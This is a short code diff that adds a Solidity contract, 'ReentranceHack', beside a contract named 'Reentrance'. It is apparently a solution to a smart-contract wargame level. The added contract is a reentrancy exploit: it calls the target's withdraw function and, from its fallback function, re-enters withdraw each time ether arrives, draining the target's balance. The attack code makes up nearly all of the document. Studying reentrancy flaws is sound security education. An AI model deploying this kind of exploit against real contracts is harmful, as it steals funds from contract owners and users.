@@ -28,3 +28,19 @@ contract Reentrance {
 
   receive() external payable {}
 }
+
+contract ReentranceHack {
+    Reentrance public curReentrance;
+
+    constructor(address payable ReentranceAdr) public  {
+        curReentrance = Reentrance(ReentranceAdr);
+    }
+
+    function callWithdraw(uint _amount) public {
+        curReentrance.withdraw(_amount);
+    }
+
+    fallback() external payable {
+        curReentrance.withdraw(msg.value);
+    }
+}
